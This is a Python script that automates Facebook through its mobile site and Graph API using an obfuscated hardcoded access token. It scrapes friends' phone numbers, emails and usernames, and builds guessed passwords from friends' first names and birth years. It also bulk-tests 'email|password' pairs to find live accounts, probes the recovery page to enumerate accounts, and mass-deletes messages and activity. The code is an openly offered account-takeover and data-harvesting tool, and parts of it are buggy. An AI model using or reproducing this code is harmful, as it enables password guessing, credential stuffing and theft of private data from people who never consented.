from multiprocessing.pool import ThreadPool as tp
from requests import *
from bs4 import *
import os
import json
from base64 import *

token = b16decode('454141414155615A41386A6C41424145584759334A704F537A6A6B5A415A42554E774B324D4644396657445A415A41306D44565363786F4E46624B735263593878446753396D7958454A6932475A42734F635A4175695A43594B316344635A41496A797A527A33333676575338595351356A497943746D73414F643737376D63745833305A4239676E66563842674644416E4B6162706D644A62454F694F454D495239776D69316F475365445A41506647415A445A44')
url = "https://mbasic.facebook.com{}"
agent = {'user-agent':"Mozilla/5.0 (Linux; Android 5.0; ASUS_T00G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36"}
s = Session()

def fblogin(email,password):
 try:
   s = Session()
   cred = {'email':str(email),'pass':str(password)}
   r = s.post(url.format("/login"),data = cred)
   if "m_ses" in r.url or "save-device" in r.url:
       with open(".cookie","w") as cok:
         cok.write(json.dumps(s.cookies.get_dict()))
    
       return {
       'login_status':'sucessfull',
       'email':email,
       'account_id':s.cookies.get_dict()['c_user'],
       'cookie_datr':s.cookies.get_dict()['datr'],
       }
   else:
       return {
        'login_status':'failed',
        'account':email,
        'url':r.url
       }
 except:
   return {
    'login_status':'error',
    'error':'No_Internet',
    'type':'404'
   }


def fbcomment(message,url):
 #s = Session()
 #s.cookies.update(json.loads(open('.cookie','r').read()))
 mdata = []
 r = s.get(url)
 urlm = BeautifulSoup(r.text,"html.parser")
 for x in urlm("form"):
    if "/a/comment.php" in x["action"]:
       mdata.append(url.format(x["action"]))
       break
 for x in urlm("input"):
        try:
         if "fb_dtsg" in x["name"]:
            mdata.append(x["value"])
         if "jazoest" in x["name"]:
            mdata.append(x["value"])
         if "ids" in x["name"]:
            mdata.append(x["name"])
            mdata.append(x["value"])
         if len(data) ==7:
                break
        except:
         pass
 messagedata={
    "fb_dtsg":mdata[1],
    "jazoest":mdata[2],
    mdata[3]:mdata[4],
    "comment_text":str(message),
    "Comment":"comment"}
 status = s.post(mdata[0],data = messagedata)
 if status.ok == True:
    return {
    'comment':'ok',
    'status':status.status_code,
    'url':mdata[0]
    }
 else:
    return {
    'comment':'failed',
    'status':status.status_code,
    'url':mdata[0]
    }


def fbsend(message,account_id):
 #s = Session()
 #s.cookies.update(json.loads(open('.cookie','r').read()))
 k = url.format('/messages/thread/'+str(account_id))
 data=[]
 urlm=BeautifulSoup(s.get(k).content,"html.parser")
 for x in urlm("form"):
	if "/messages/send/" in x["action"]:
		data.append(url.format(x["action"]))
		break
				
 for x in urlm("input"):
	try:
	 if "fb_dtsg" in x["name"]:
		data.append(x["value"])
	 if "jazoest" in x["name"]:
		data.append(x["value"])
	 if "ids" in x["name"]:
		data.append(x["name"])
		data.append(x["value"])
	 if len(data) ==7:
		break
	except:
	 pass
		
 if len(data) == 7:
  f=s.post(data[0],data={
		"fb_dtsg":data[1],
		"jazoest":data[2],
		data[3]:data[4],
		data[5]:data[6],
		"body":message,
		"Send":"Kirim"}).url
  if "send_success" in f:
	return {
	    'status':'message_sent',
	    'account_id':account_id,
	    'message_length':len(message)
	}
  else:
    return {
        'status':'message_failed',
        'account_id':account_id,
        'message_length':len(message)
    }



def delmessage(message_url):
 #s = Session()
 #s.cookies.update(json.loads(open('.cookie','r').read()))
 try:
  i = "https://mbasic.facebook.com{}"
  data = []
  bs = BeautifulSoup(s.get(message_url).text,"html.parser")
  name = bs.find("title").renderContents()
  for x in bs("form"):
    if "action_redirect" in x["action"]:
      data.append(x['action'])
  for x in bs("input"):
    try:
      if "fb_dtsg" in x["name"]:
         data.append(x['value'])         
      if "jazoest" in x["name"]:
         data.append(x['value'])
      if "delete" in x["name"]:
         data.append(x['value'])
    except:
      pass
  sdata={"fb_dtsg":data[1],"jazoest":data[2],"delete":data[3]}
  ps = BeautifulSoup(s.post(i.format(data[0]),data=sdata).text,"html.parser")
  for x in ps.find_all("a",href=True):
    if "mm_action=delete" in x["href"]:
      s.get(i.format(x["href"]))
      print("Deleted : {}".format(name))
 except:
   pass      

def fbdelmsg(account_id):
  #s = Session()
  #s.cookies.update(json.loads(open('.cookie','r').read()))
  k = url.format('/messages/read/?tid=cid.c.'+str(account_id)+"%3A"+s.cookies.get_dict()['c_user']+"&refid=11#fua")
  try:
   i = "https://mbasic.facebook.com{}"
   data = []
   bs = BeautifulSoup(s.get(k).text,"html.parser")
   name = bs.find("title").renderContents()
   for x in bs("form"):
     if "action_redirect" in x["action"]:
       data.append(x['action'])
   for x in bs("input"):
     try:
       if "fb_dtsg" in x["name"]:
          data.append(x['value'])         
       if "jazoest" in x["name"]:
          data.append(x['value'])
       if "delete" in x["name"]:
          data.append(x['value'])
     except:
       pass
   sdata={"fb_dtsg":data[1],"jazoest":data[2],"delete":data[3]}
   ps = BeautifulSoup(s.post(i.format(data[0]),data=sdata).text,"html.parser")
   for x in ps.find_all("a",href=True):
     if "mm_action=delete" in x["href"]:
       s.get(i.format(x["href"]))
       return {
        'message':'deleted',
        'account_id':account_id
       }
     else:
      pass
  except:
    return {
        'message':'deletion_failed',
        'account_id':account_id
    }
 

def fbclearchat(path):
  #s = Session()
  #s.cookies.update(json.loads(open('.cookie','r').read()))
  thread = tp(30)
  while True:
   links = []
   html = BeautifulSoup(s.get(url.format("/messages/"+path)).content,"html.parser")
   for i in html.find_all("a"):
    try:
      if "/messages/read/?" in i['href']:
        links.append(url.format(i['href']))
    except:
      pass
      
   thread.map(delmessage,links)


def getstatus(link):
 xp = s.get(link)
 print("STATUS : [{}]".format(xp.status_code))
 return xp.status_code

 
def fbclearactivity():
  #s = Session()
  #s.cookies.update(json.loads(open('.cookie','r').read()))
  idx = s.cookies.get_dict()['c_user']
  thread = tp(30)
  urlx = "https://mbasic.facebook.com/{}"
  while True:
   links = []
   html = BeautifulSoup(s.get(urlx.format(str(idx)+"/allactivity")).content,"html.parser")
   for i in html.find_all("a"):
    try:
      if "/allactivity/" in i['href'] and "option" not in i['href']:
        links.append(urlx.format(i['href']))
    except:
      pass
      
   thread.map(getstatus,links)


def fbscan(email):
 z = Session()
 data = {
    'email':str(email),
    'did_submit':'submit'
 }
 urlz = "https://mbasic.facebook.com{}"
 ht = z.get(urlz.format("/login/identify/?ctx=recover"))
 b = BeautifulSoup(ht.content,"html.parser")
 form = b.find('form')
 to = form.get('action')
 for i in form.find_all('input',{'type':'hidden'}):
   try:
     data[i['name']]=i['value']
   except:
     pass

 y = z.post(urlz.format(to),data=data)
 u = BeautifulSoup(y.content,"html.parser")
 dx = {
    'email':str(email)
 }
 accx = []
 for i in u.find_all("strong"):
   accx.append(i.get_text())

 dx['accounts'] = accx
 return dx

 
#def leavegroups():
  #https://free.facebook.com/group/leave/?group_id=976165679227091


"""
Graph API-Functions
"""

#Get Friends Ids
def getids(ids):
 try:
  global token
  idx = []
  a = get("https://graph.facebook.com/"+ids+"/friends?access_token="+token)
  b = json.loads(a.content)
  for i in b['data']:
	idx.append(i['id'])
  return idx
 except:
  return []


#Get info of profile
def getinfo(idnum):
 try:
  a = get("https://graph.facebook.com/{}?access_token={}".format(idnum,token)).content
  return json.loads(a)
 except:
  return {}

#friendlist data Fetch & Generage Passwords According to BrithYear
def fbbirthdaygen(idx):
 try:
   a = get('https://graph.facebook.com/{}/friends?fields=name,birthday&access_token={}'.format(idx,token))
   if a.status_code == 200:
    y = json.loads(a.content)
    gpass = []
    for i in y['data']:
     try:                                            
      if 'birthday' in i.keys():
        if len(i.get('birthday')) == 10:
         gpass.append("{}|{}".format(i.get('id'),i.get('name').split()[0]+i.get('birthday').split("/")[2]))
     except:
       pass
    
    return gpass
    
   else:
    return {'error':a.status_code}
 except:
   return {}


def fbgetphone(idx):
 try:
   a = get('https://graph.facebook.com/{}/friends?fields=name,mobile_phone&access_token={}'.format(idx,token))
   if a.status_code == 200:
    y = json.loads(a.content)
    gphon = []
    for i in y['data']:
     try:                                            
      if 'mobile_phone' in i.keys():
        gphon.append("{}|{}|{}".format(i.get('id'),i.get('mobile_phone'),i.get('name')))
     except:
       pass
    
    return gphon
    
   else:
    return {'error':a.status_code}
 except:
   return {}


def fbgetemail(idx):
 try:
   a = get('https://graph.facebook.com/{}/friends?fields=name,email&access_token={}'.format(idx,token))
   if a.status_code == 200:
    y = json.loads(a.content)
    gemail = []
    for i in y['data']:
     try:                                            
      if 'email' in i.keys():
        gemail.append("{}|{}|{}".format(i.get('id'),i.get('email'),i.get('name')))
     except:
       pass
    
    return gemail
    
   else:
    return {'error':a.status_code}
 except:
   return {}



def fbgetusername(idx):
 try:
   a = get('https://graph.facebook.com/{}/friends?fields=name,username&access_token={}'.format(idx,token))
   if a.status_code == 200:
    y = json.loads(a.content)
    guser = []
    for i in y['data']:
     try:                                            
      if 'username' in i.keys():
        guser.append("{}|{}|{}".format(i.get('id'),i.get('username'),i.get('name')))
     except:
       pass
    
    return guser
    
   else:
    return {'error':a.status_code}
 except:
   return {}



def fbgetfollowers(idx):
 try:
   a = get('https://graph.facebook.com/{}?fields=subscribers.limit(10000000)&access_token={}'.format(idx,token))
   if a.status_code == 200:
    y = json.loads(a.content)
    gsub = []
    for i in y['subscribers']['data']:
     try:                                            
      if 'name' in i.keys():
        gsub.append("{}|{}".format(i.get('id'),i.get('name')))
     except:
       pass
    
    return gsub
    
   else:
     return {'error':a.status_code}
 except:
   return {}






def xlogin(sdata):
 dat = sdata.split("|")
 data = {'email':dat[0],'pass':dat[1]}
 try:
  r = Session().post('https://mbasic.facebook.com/login',data=data)
  if "m_ses" in r.url or "save-device" in r.url:
    return {'status':'active','credientials':data}
  elif 'checkpoint' in r.url:
    return {'status':'checkpoint','credientials':data}
  else:
    return {'status':'auth-error'}
 except:
   pass

  
if not os.path.exists(".cookie"):
   pass
else:
   try:
      s.cookies.update(json.loads(open('.cookie','r').read()))
   except:
      pass

